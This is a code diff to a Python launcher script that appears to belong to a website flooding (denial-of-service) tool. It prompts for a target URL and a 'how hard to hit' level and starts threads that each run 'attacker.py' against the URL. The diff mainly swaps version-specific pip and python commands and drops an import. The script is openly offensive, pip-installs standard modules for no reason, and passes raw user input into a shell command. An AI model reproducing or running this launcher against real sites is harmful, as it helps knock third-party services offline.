@@ -3,25 +3,19 @@ try:
   import time
 except:
   print("Installing Dependency: Time")
-  os.system("pip3 install time")
-try:
-  import pyautogui
-except:
-  print("Installing Dependency: Pyautogui")
-  os.system("pip3 install pyautogui")
+  os.system("pip3.9 install time")
 try:
   import time
 except:
   print("Installing Dependency: Threading")
-  os.system("pip3 install Threading")
+  os.system("pip3.9 install Threading")
 import threading
-import pyautogui
 import time
 ip = input("URL: ")
 count = input("How hard to hit: 1-50 (Only go more than 3 if your computer supports it): ")
 def attack():
   print("Starting Thread!")
-  os.system("python3 attacker.py "+ip)
+  os.system("python3.9 attacker.py "+ip)
 if __name__ == "__main__":
   t1 = threading.Thread(target=attack)
   t2 = threading.Thread(target=attack)
